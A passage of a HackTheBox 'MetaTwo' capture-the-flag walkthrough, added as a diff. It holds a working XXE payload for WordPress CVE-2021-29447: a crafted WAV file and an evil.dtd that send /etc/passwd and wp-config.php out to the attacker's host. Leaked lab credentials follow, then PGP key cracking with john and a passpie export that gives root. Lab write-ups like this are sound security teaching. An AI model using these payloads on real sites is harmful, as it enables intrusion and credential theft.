@@ -524,3 +524,436 @@ And it worked!!!
 Now, there were too many way through which I could upload media and I kind of knew that this was my way in, to obtain a reverse shell through file upload.
 
 Now, I knew the website was running on `Wordpress v5.6.2` so, I decided to search if any vulnerabilities related to this particular version exists
+
+And I found one, the [CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/), which has an XXE Vulnerability but requires some type of user access to the admin console.
+
+So, now that we have `manager's` credentials, we need to create two files:
+1. `payload.wav` which is a WAVE file through which you can inject your payload inside the `iXML` metatag.
+2. `evil.dtd` file.
+
+So, to create a `payload.wav` file,
+
+```
+echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.27:8888/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+```
+
+For `evil.dtd` file, 
+
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.27:8888/?p=%file;'>" >
+```
+
+Here, I decided to use `/etc/passwd` to check if the exploit works or not.
+
+Now, that I've created two files, I started a python server in the same directory where these two files were stored.
+
+```
+python -m http.server 8888
+```
+
+Then, I visited the website, and tried to upload the `payload.wav` file.
+
+![meta-9](https://user-images.githubusercontent.com/87711310/219140887-88bf63bc-1c3c-496a-af2c-7557f2358d67.png)
+
+
+It gave me an error, but when I checked the response on my python server, I got back something.
+
+![meta-10](https://user-images.githubusercontent.com/87711310/219140875-b41a4b42-27e3-4d5f-a937-74e4fb374361.png)
+
+
+It seemed like a `Base-64` encoded string, so I decided to decode the string.
+
+```
+echo <string> | bas64 -d > b64-decode.txt
+```
+
+And viewing the contents of the file, I got back the contents of the `/etc/passwd` as mentioned in the payload.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ cat b64-decode.txt 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+```
+
+Once, I knew the exploit was running properly, I decided to retrieve the contents of `wp-config.php` file.
+
+The changes in the `evil.dtd` file are:
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.27:8888/?p=%file;'>" >
+```
+
+Re-uploading the `payload.wav` file, I get back a response and decoding it
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ cat b64-decode-wp-config.txt 
+<?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+```
+
+Here, I got back ftp credentials `metapress.htb:9NYS_ii@FyL_p5M2NvJ`
+
+Using these credentials, I was able to log into the ftp server where there were two directories, `blog` & `mailer`
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ ftp metapress.htb                                                                   
+Connected to metapress.htb.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (metapress.htb:darshan): metapress.htb
+331 Password required for metapress.htb
+Password: 
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||7571|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
+```
+
+On Further enumeration, I found `send_email.php` inside `mailer` directory.
+
+```
+ftp> cd mailer
+250 CWD command successful
+ftp> ls
+229 Entering Extended Passive Mode (|||24755|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
+226 Transfer complete
+ftp> wget send_email.php
+?Invalid command.
+ftp> mget send_email.php
+mget send_email.php [anpqy?]? y
+229 Entering Extended Passive Mode (|||34699|)
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+100% |******************************************************************************************************************************************************************************************************************|  1126       20.65 MiB/s    00:00 ETA226 Transfer complete
+1126 bytes received in 00:00 (8.84 KiB/s)
+```
+
+Viewing the contents of `send_mail.php`, I found user credentials.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ cat send_email.php                         
+<?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+$mail = new PHPMailer(true);
+
+$mail->SMTPDebug = 3;                               
+$mail->isSMTP();            
+
+$mail->Host = "mail.metapress.htb";
+$mail->SMTPAuth = true;                          
+$mail->Username = "jnelson@metapress.htb";                 
+$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
+$mail->SMTPSecure = "tls";                           
+$mail->Port = 587;                                   
+
+$mail->From = "jnelson@metapress.htb";
+$mail->FromName = "James Nelson";
+
+$mail->addAddress("info@metapress.htb");
+
+$mail->isHTML(true);
+
+$mail->Subject = "Startup";
+$mail->Body = "<i>We just started our new blog metapress.htb!</i>";
+
+try {
+    $mail->send();
+    echo "Message has been sent successfully";
+} catch (Exception $e) {
+    echo "Mailer Error: " . $mail->ErrorInfo;
+}
+```
+
+So, I decided to use these credentials to login through ssh.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ ssh jnelson@metapress.htb             
+The authenticity of host 'metapress.htb (10.10.11.186)' can't be established.
+ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'metapress.htb' (ED25519) to the list of known hosts.
+jnelson@metapress.htb's password: 
+Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 14 19:37:30 2023 from 10.10.14.38
+jnelson@meta2:~$ whoami
+jnelson
+```
+
+Grabbing the user flag.
+
+```
+jnelson@meta2:~$ ls
+linpeas.sh  pass  user.txt
+jnelson@meta2:~$ cat user.txt 
+[REDACTED]
+```
+
+## Privilege Escalation
+Now, to escalate my privileges, I ran `sudo -l`, but the user nelson wasnt allowed to run sudo on the machine.
+
+```
+```
+
+So, next, I listed the files in the user's directory and found two interesting files: `linpeas.sh` and `.passpie`
+
+I googled what `passpie` is and found out that, Passpie is a command line tool to manage passwords from the terminal with a colorful and configurable interface.
+
+So, you can just run passpie.
+
+```
+jnelson@meta2:~$ passpie
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛
+
+```
+
+The password for ssh is stored but is encrypted with a passphrase and the private key for the ssh key is stored in the `.key` files as it encrypts the ssh key.
+
+
+
+```
+jnelson@meta2:~$ cd .passpie/
+jnelson@meta2:~/.passpie$ ls
+ssh
+jnelson@meta2:~/.passpie$  ls -la
+total 24
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
+drwxr-xr-x 5 jnelson jnelson 4096 Feb 14 19:56 ..
+-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
+-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
+```
+
+So, now, I jsut decided to copy the private key block from the `.keys` file.
+
+```
+jnelson@meta2:~/.passpie$ cat .keys
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+..[snip]...
+GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+Po3KGdNgA/04lhPjdN3wrzjU3qmrL
+fo6KI+w2uXLaw+bIT1XZurDN
+=dqsF
+-----END PGP PUBLIC KEY BLOCK-----
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
+...[snip]...
+uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J
+-----END PGP PRIVATE KEY BLOCK-----
+
+```
+
+Then I used, gpg2john and john the ripper to extract and crack the password from the private key.
+
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ echo -en '-----BEGIN PGP PRIVATE KEY BLOCK-----                                                                                                                                                        
+
+lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
+...[snip]...
+o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----' > hash-key
+                                                                                                                                                                                                                                                                                                                            
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ gpg2john hash-key > crackthehash
+
+File hash-key
+                                                                                
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crackthehash         
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[REDACTED]         (Passpie)     
+1g 0:00:00:05 DONE (2023-02-15 14:56) 0.1956g/s 32.09p/s 32.09c/s 32.09C/s peanut..blink182
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+Then, after getting passie password manager's password, I tried to export the file by entering the recently cracked password.
+
+```
+jnelson@meta2:~/.passpie$ cd ..
+jnelson@meta2:~$ ls
+linpeas.sh  pass  user.txt
+jnelson@meta2:~$ ls -la
+total 848
+drwxr-xr-x 5 jnelson jnelson   4096 Feb 14 19:56 .
+drwxr-xr-x 3 root    root      4096 Oct  5 15:12 ..
+lrwxrwxrwx 1 root    root         9 Jun 26  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 jnelson jnelson    220 Jun 26  2022 .bash_logout
+-rw-r--r-- 1 jnelson jnelson   3526 Jun 26  2022 .bashrc
+drwx------ 3 jnelson jnelson   4096 Feb 14 19:48 .gnupg
+-rwxr-xr-x 1 jnelson jnelson 825665 Sep  4 05:54 linpeas.sh
+drwxr-xr-x 3 jnelson jnelson   4096 Oct 25 12:51 .local
+-rw-r--r-- 1 jnelson jnelson    347 Feb 14 19:56 pass
+dr-xr-x--- 3 jnelson jnelson   4096 Oct 25 12:52 .passpie
+-rw-r--r-- 1 jnelson jnelson    807 Jun 26  2022 .profile
+-rw-r----- 1 root    jnelson     33 Feb 14 17:37 user.txt
+jnelson@meta2:~$ passpie export output.txt
+Passphrase: 
+jnelson@meta2:~$ ls
+linpeas.sh  output.txt  pass  user.txt
+jnelson@meta2:~$ cat output.txt
+credentials:
+- comment: ''
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode '[REDACTED]'
+- comment: ''
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
+handler: passpie
+version: 1.0
+```
+
+Here, I got the root's password and I was able to login as a root user.
+
+```
+jnelson@meta2:~$ su root
+Password: 
+root@meta2:/home/jnelson# whoami
+root
+```
+
+
+Grabbing the root flag.
+
+```
+root@meta2:/home/jnelson# cat /root/root.txt
+[REDACTED]
+```
